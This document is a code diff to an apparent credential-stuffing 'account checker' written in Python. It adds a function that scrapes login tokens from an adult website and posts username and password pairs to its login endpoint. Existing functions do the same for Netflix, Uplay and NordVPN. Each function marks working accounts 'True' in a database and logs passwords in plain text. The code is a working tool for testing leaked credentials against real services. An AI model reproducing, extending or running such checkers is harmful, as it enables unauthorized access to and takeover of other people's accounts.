@@ -1,5 +1,6 @@
 from manage_requests import ManageRequests
 from bs4 import BeautifulSoup
+import json
 import base64
 import logging as log
 
@@ -19,6 +20,40 @@ import logging as log
 #                                 data={"username": usr, "password": pwd, "csrf_token": csrf},
 #                                 cookies=cookies)
 #     print(res.content)
+#
+
+def pornhub(usr, pwd, mr):
+    mr : ManageRequests
+    post_url = "https://www.pornhub.com/front/authenticate"
+    get_url = "https://www.pornhub.com/"
+
+    # Get main page with redirect and token
+    res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
+    # Filter out redirect and token
+    soup = BeautifulSoup(res.text, features="html.parser")
+    redirect = soup.find('input', attrs={'name': 'redirect'})['value']
+    token = soup.find('input', attrs={'name': 'token'})['value']
+
+    # Post request to login
+    res = mr.post_with_checks(post_url,
+                              data={'username': usr,
+                                    'password': pwd,
+                                    'subscribe': 'undefined',
+                                    'setSendTip': 'false',
+                                    'remember_me': '0',
+                                    'from': 'pc_login_modal_:index',
+                                    'redirect': redirect,
+                                    'token': token,
+                                    })
+
+    if int(json.loads(res.content)["success"]) == 1:
+        mr.db.update_result(usr, pwd, "pornhub", "True")
+        log.info("Account valid {}".format(usr))
+    else:
+        mr.db.update_result(usr, pwd, "pornhub", "False")
+        log.info("Account error {} {}".format(usr, pwd))
+    log.info("-------------------------------")
+    mr.req.cookies.clear()
 
 def netflix(usr, pwd, mr):
     mr : ManageRequests
@@ -51,8 +86,8 @@ def netflix(usr, pwd, mr):
         log.info("Account error {} {}".format(usr, pwd))
     log.info("-------------------------------")
     mr.req.cookies.clear()
-    
-    
+
+
 def uplay(usr, pwd, mr):
     mr: ManageRequests
     usr: str
@@ -63,7 +98,7 @@ def uplay(usr, pwd, mr):
     mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
                       "Authorization": "Basic " + encoding}
     res = mr.post_with_checks(site_post)
-    
+
     if res:
         if res.status_code == 200:
             mr.db.update_result(usr, pwd, "uplay", "True")
@@ -74,11 +109,11 @@ def uplay(usr, pwd, mr):
     else:
         mr.db.update_result(usr, pwd, "uplay", "False")
         log.info("Account error {} {}".format(usr, pwd))
-    
+
     log.info("-------------------------------")
     mr.req.cookies.clear()
-    
-    
+
+
 def nordvpn(usr, pwd, mr):
     """
     Custom functions must have 3 params: username and password to check, and a ManageRequests object
